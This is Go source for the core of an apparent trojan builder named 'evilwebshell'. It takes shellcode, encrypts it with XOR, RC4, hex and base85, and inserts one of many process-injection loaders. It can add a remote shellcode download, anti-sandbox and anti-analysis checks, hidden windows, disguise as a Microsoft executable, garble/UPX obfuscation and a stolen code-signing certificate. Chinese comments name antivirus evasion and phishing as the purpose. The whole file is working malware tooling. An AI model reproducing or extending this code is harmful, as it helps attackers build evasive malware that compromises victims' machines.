package core

import (
	"embed"
	"evilwebshell/encode"
	"evilwebshell/sandbox"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path"
	"strings"
	"syscall"
)

const (
	SANDBOX = "sandbox"
	ENCODE  = "decode"
	TempDir = "temp"
	MAIN    = "main"
	QUANJU  = "quanju"
	FUNCT   = "funct"
)

type Option struct {
	Keyname           string
	Shellname         string
	Suiji             string
	Xor               string
	Rc4               string
	Canshu            string
	Module            string
	SrcFile           string
	DstFile           string
	ShellcodeEncode   string
	Donut             bool
	Separate          string
	ShellcodeLocation string
	ShellcodeUrl      string
	SignFileLoc       string
	AntiSandboxOpt    AntiSandboxOption
	BuildOpt          BuildOption
}

type AntiSandboxOption struct {
	TimeStart      bool `根据木马运行时间确定启动参数`
	RamCheck       bool `通过检查内存来反沙箱`
	CpuNumberCheck bool `通过检查cpu的核数来反沙箱`
	WechatCheck    bool `检查是否存在微信来反沙箱，适合钓鱼使用`
	DiskSizeCheck  bool `检查硬盘大小来反沙箱`
	Bypassweibu    bool `加强型反微步在线，只是测试`
}

type BuildOption struct {
	Garble     bool `是否使用garble进行编译`
	Upx        bool `编译之后是否使用upx进行压缩加壳，压缩效果很好`
	LiteralObf bool `需配合garble使用！混淆字符串`
	SeedRandom bool `需配合garble使用！`
	Fake       bool `伪装成其他微软程序`
	Hide       bool `隐藏黑框,会减少免杀效果`
}

// 必须在该文件下放置module文件夹
//
//go:embed "module"
var moduleFolder embed.FS

var Modules = make(map[string][]byte, 8)

// 通过embed将模块的loader装载进程序，不再依赖本地文件
func init() {
	n, _ := moduleFolder.ReadDir("module")
	println(len(n))
	for i := 0; i < len(n); i++ {
		nf, _ := n[i].Info()
		loaderFileContent, _ := moduleFolder.ReadFile(path.Join("module", nf.Name(), "main.go"))
		Modules[nf.Name()] = loaderFileContent
	}
}

// MakeTrojan module string, shellcodencode string, sanboxopt Antisandboxopt, buildopt2 Buildopt, donut bool, srcfile string, trojan string
func MakeTrojan(options Option) {
	//创建一个隐藏文件夹
	os.Mkdir(TempDir, os.ModePerm)
	TempName, err := syscall.UTF16PtrFromString(TempDir)
	if err != nil {
		log.Println(err)
	}
	err = syscall.SetFileAttributes(TempName, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		log.Println(err)
	}
	//将payload放入temp文件夹下
	if options.Donut {
		PE2shellcode(options.SrcFile, options.Shellname)
	} else {
		FileCopy(options.SrcFile, path.Join(TempDir, options.Shellname))
	}
	//根据选取的module将loader文件放入临时文件夹
	err = ioutil.WriteFile(path.Join(TempDir, "main.go"), Modules[options.Module], os.ModePerm)
	if err != nil {
		log.Println(err)
	}
	//通过时间生成的key放入临时文件夹
	//TODO:使用随机种子生成满足各种加密形式的key

	key := generateKey(options.Keyname)
	//加密shellcode
	encodeShellcode(options.ShellcodeEncode, key, options.Shellname, options.Keyname, options.Xor, options.Rc4, options.Canshu)
	//分离加载shellcode
	log.Println(options.Shellname)
	jiazai(options.Module, options.Shellname, options.Suiji)
	log.Println(options.Shellname)
	if options.Separate != "" {
		addSeparate(options.ShellcodeLocation, options.ShellcodeUrl, options.Separate, options.Shellname)
	}
	//隐藏cmd窗口
	if options.BuildOpt.Hide {
		addHideWindows()
	}
	//添加沙箱
	addAntiSandbox(options.AntiSandboxOpt)
	//伪装成微软其他exe
	if options.BuildOpt.Fake {
		generatesyso()
	}
	//根据build参数生成木马
	finalBuild(options.BuildOpt, options.DstFile)
	//窃取签名
	if options.SignFileLoc != "" {
		FileCopy(options.DstFile, path.Join(TempDir, "cert-before.exe"))
		writecertfromexe(path.Join(TempDir, "cert-after.exe"), path.Join(TempDir, "cert-before.exe"), options.SignFileLoc)
		FileCopy(path.Join(TempDir, "cert-after.exe"), options.DstFile)
	}

	println("build done!")
	//清理临时文件夹
	os.RemoveAll(TempDir)
}
func addSeparate(location string, url string, method string, shellname string) {
	var separateCode []string
	fileBefore := strings.Split(location, "\\")
	file := fileBefore[len(fileBefore)-1]
	println(file)
	FileCopy(path.Join(TempDir, shellname), file)
	ioutil.WriteFile(path.Join(TempDir, shellname), []byte(""), os.ModePerm)
	location = strings.ReplaceAll(location, "\\", "\\\\")
	if method == "remote shellcode" {
		separateCode = []string{`res, _ := http.Get("` + url + `")
    ` + shellname + `, _ = ioutil.ReadAll(res.Body)`, `
	"net/http"
	"io/ioutil"
	//__IMPORT__`}
	} else {
		separateCode = []string{shellname + `, _ = ioutil.ReadFile("` + location + `")`, `
	"io/ioutil"
	//__IMPORT__`}
	}
	addCode(separateCode, "separate")
}

func addHideWindows() {
	hideCode := []string{`win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)`, `
	"github.com/lxn/win"
	//__IMPORT__`}
	addCode(hideCode, "hide")
}

func encodeShellcode(shellcodeEncode string, key []byte, shellName string, keyName string, xor string, c4r string, canshu string) {
	var afterBytecode []byte
	beforeBytecode, _ := ioutil.ReadFile(path.Join(TempDir, shellName))
	switch shellcodeEncode {
	//xor + hex + base85
	case "2xor+rc4+hex+base85":
		afterBytecode = encode.Encode1(beforeBytecode, key)
		println("shellcode xor+hex+base85加密完成！")
		addCode1(encode.Decode1string, ENCODE, keyName, shellName, xor, c4r, canshu)
	case "xor+rc4+hex+base85":
		afterBytecode = encode.Encode2(beforeBytecode, key)
		println("xor+rc4+hex+base85！")
		addCode1(encode.Decode2string, ENCODE, keyName, shellName, xor, c4r, canshu)
	case "rc4+hex+base85":
		afterBytecode = encode.Encode3(beforeBytecode, key)
		println("rc4+hex+base85！")
		addCode1(encode.Decode3string, ENCODE, keyName, shellName, xor, c4r, canshu)
	}
	ioutil.WriteFile(path.Join(TempDir, shellName), afterBytecode, os.ModePerm)
	println(shellName)
	println("loader 添加解密代码完成！")
}

func jiazai(fangshi string, mingzi string, sj string) {

	switch fangshi {
	case "CreateFiber":
		println("CreateFiber加载写入！")
		addCode2(encode.CreateFibercvar, QUANJU, mingzi, sj)
		addCode2(encode.CreateFibermain, MAIN, mingzi, sj)
	case "FUCKFUCK":
		println("FUCKFUCK加载写入！")
		addCode2(encode.FUCKFUCKvar, QUANJU, mingzi, sj)
		addCode2(encode.FUCKFUCKmain, MAIN, mingzi, sj)
	case "CreateProcess":
		println("CreateProcess加载写入！")
		addCode2(encode.CreateProcessvar, QUANJU, mingzi, sj)
		addCode2(encode.CreateProcessmain, MAIN, mingzi, sj)
	case "CreateThread":
		println("CreateThread加载写入！")
		addCode2(encode.CreateThreadvar, QUANJU, mingzi, sj)
		addCode2(encode.CreateThreadmain, MAIN, mingzi, sj)
	case "CreateRemoteThread":
		println("CreateRemoteThread加载写入！")
		addCode2(encode.CreateRemoteThreadvar, QUANJU, mingzi, sj)
		addCode2(encode.CreateRemoteThreadmain, MAIN, mingzi, sj)
	case "EarlyBird":
		println("EarlyBird加载写入！")
		addCode2(encode.EarlyBirdvar, QUANJU, mingzi, sj)
		addCode2(encode.EarlyBirdmain, MAIN, mingzi, sj)
	case "CreateThreadNative":
		println("CreateThreadNative加载写入！")
		addCode2(encode.CreateThreadNativevar, QUANJU, mingzi, sj)
		addCode2(encode.CreateThreadNativemain, MAIN, mingzi, sj)

	case "RtlCreateUserThread":
		println("RtlCreateUserThread加载写入！")
		addCode2(encode.RtlCreateUserThreadvar, QUANJU, mingzi, sj)
		addCode2(encode.RtlCreateUserThreadmain, MAIN, mingzi, sj)
	case "CreateRemoteThreadNative":
		println("CreateRemoteThreadNative加载写入！")
		addCode2(encode.CreateRemoteThreadNativevar, QUANJU, mingzi, sj)
		addCode2(encode.CreateRemoteThreadNativemain, MAIN, mingzi, sj)
	case "EtwpCreateEtwThread":
		println("EtwpCreateEtwThread加载写入！")
		addCode2(encode.EtwpCreateEtwThreadvar, QUANJU, mingzi, sj)
		addCode2(encode.EtwpCreateEtwThreadmain, MAIN, mingzi, sj)
	case "HeapAlloc":
		println("HeapAlloc加载写入！")
		addCode2(encode.HeapAllocvar, QUANJU, mingzi, sj)
		addCode2(encode.HeapAllocmain, MAIN, mingzi, sj)
	case "UuidFromString":
		println("UuidFromString加载写入！")
		addCode2(encode.UuidFromStringvar, QUANJU, mingzi, sj)
		addCode2(encode.UuidFromStringmain, MAIN, mingzi, sj)
	case "NtQueueApcThreadEx":
		println("NtQueueApcThreadEx加载写入！")
		addCode2(encode.NtQueueApcThreadExvar, QUANJU, mingzi, sj)
		addCode2(encode.NtQueueApcThreadExmain, MAIN, mingzi, sj)

	}
	println("loader 加载代码完成！")
}
func addAntiSandbox(opt AntiSandboxOption) {
	if opt.TimeStart {
		addCode(sandbox.Timestart, SANDBOX)
	}
	if opt.RamCheck {
		addCode(sandbox.Ramcheck, SANDBOX)
	}
	if opt.CpuNumberCheck {
		addCode(sandbox.Cpunumber, SANDBOX)
	}
	if opt.DiskSizeCheck {
		addCode(sandbox.Disksizecheck, SANDBOX)
	}
	if opt.WechatCheck {
		addCode(sandbox.Wechatexist, SANDBOX)
	}
	if opt.Bypassweibu {
		addCode(sandbox.Weibucheck, SANDBOX)
		addCode(sandbox.Weibucheckfunc, FUNCT)

	}

	println("sandbox down!")
}

func finalBuild(buildOpt BuildOption, dstFile string) {
	println("start build")
	if buildOpt.Garble {
		println("garble:")
		command := []string{
			"build",
			"-o",
			dstFile,
			//path.Join(TempDir, "main.go"),
		}
		opt := make([]string, 0, 12)
		if buildOpt.SeedRandom {
			opt = append(opt, "-seed=random")
		}
		if buildOpt.LiteralObf {
			opt = append(opt, "-literals")
		}
		opt = append(opt, command...)
		//println(len(opt))
		fmt.Printf("%v", opt)
		cmd := exec.Command("garble", opt...)
		cmd.Dir = TempDir
		println(cmd.String())
		if err := cmd.Run(); err != nil {
			log.Fatalln(err)
		}
	} else {
		command := []string{
			"build",
			"-o",
			dstFile,
			"-trimpath",
			"-ldflags",
			"-s -w",
		}
		//command = append(command, "main.go")
		cmd := exec.Command("go", command...)
		cmd.Dir = TempDir
		println(cmd.String())
		if err := cmd.Run(); err != nil {
			log.Fatalln(err)
		}
	}
	FileCopy(path.Join(TempDir, dstFile), dstFile)
}
